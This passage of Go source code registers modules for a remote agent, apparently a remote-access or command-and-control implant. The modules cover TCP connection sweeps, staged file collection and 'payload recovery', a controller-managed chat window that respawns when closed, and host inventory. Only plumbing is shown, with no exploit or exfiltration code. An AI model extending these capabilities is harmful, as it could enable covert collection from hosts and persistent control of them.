	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *tcpConnectionsModule) Shutdown(context.Context) error {
	// no shutdown hooks required for TCP connection sweeps today
	return nil
}

type recoveryModule struct {
	manager *recovery.Manager
}

func (m *recoveryModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "recovery",
		Title:       "Recovery Operations",
		Description: "Coordinate staged collection tasks and payload recovery.",
		Commands:    []string{"recovery"},
		Capabilities: []ModuleCapability{
			{
				Name:        "recovery.queue",
				Description: "Queue recovery jobs for background execution.",
			},
			{
				Name:        "recovery.collect",
				Description: "Collect files and artifacts staged by other modules.",
			},
		},
	}
}

func (m *recoveryModule) ID() string {
	return "recovery"
}

func (m *recoveryModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *recoveryModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *recoveryModule) configure(runtime Config) error {
	cfg := recovery.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = recovery.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *recoveryModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "recovery subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *recoveryModule) Shutdown(context.Context) error {
	if m.manager != nil {
		m.manager.Shutdown()
	}
	return nil
}

type clientChatModule struct {
	supervisor *clientchat.Supervisor
}

func (m *clientChatModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "client-chat",
		Title:       "Client Chat",
		Description: "Maintain a persistent, controller-managed chat window on the client.",
		Commands:    []string{"client-chat"},
		Capabilities: []ModuleCapability{
			{
				Name:        "client-chat.persist",
				Description: "Respawn the client chat interface if the process terminates unexpectedly.",
			},
			{
				Name:        "client-chat.alias",
				Description: "Apply controller-provided aliases for both participants in real time.",
			},
		},
	}
}

func (m *clientChatModule) ID() string {
	return "client-chat"
}

func (m *clientChatModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *clientChatModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *clientChatModule) configure(runtime Config) error {
	cfg := clientchat.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.supervisor == nil {
		m.supervisor = clientchat.NewSupervisor(cfg)
		return nil
	}
	m.supervisor.UpdateConfig(cfg)
	return nil
}

func (m *clientChatModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.supervisor == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "client chat subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	return WrapCommandResult(m.supervisor.HandleCommand(ctx, cmd))
}

func (m *clientChatModule) Shutdown(ctx context.Context) error {
	if m.supervisor != nil {
		m.supervisor.Shutdown(ctx)
	}
	return nil
}

type systemInfoModule struct {
	collector *systeminfo.Collector
}

func (m *systemInfoModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "system-info",
		Title:       "System Information",
		Description: "Collect host metadata, hardware configuration, and runtime inventory.",
		Commands:    []string{"system-info"},
		Capabilities: []ModuleCapability{
			{
				Name:        "system-info.snapshot",
				Description: "Provide a structured snapshot of operating system and hardware data.",
			},
			{
				Name:        "system-info.telemetry",
				Description: "Report live telemetry metrics used by other modules for scheduling.",
			},
		},
	}
}

func (m *systemInfoModule) ID() string {
	return "system-info"
}

func (m *systemInfoModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *systemInfoModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *systemInfoModule) configure(runtime Config) error {
	if runtime.Provider == nil {
		return fmt.Errorf("missing agent provider")
	}
	m.collector = systeminfo.NewCollector(runtime.Provider, runtime.BuildVersion)
	return nil
}

func (m *systemInfoModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.collector == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "system information subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	return WrapCommandResult(m.collector.HandleCommand(ctx, cmd))
}

func (m *systemInfoModule) Shutdown(context.Context) error {
	return nil
}
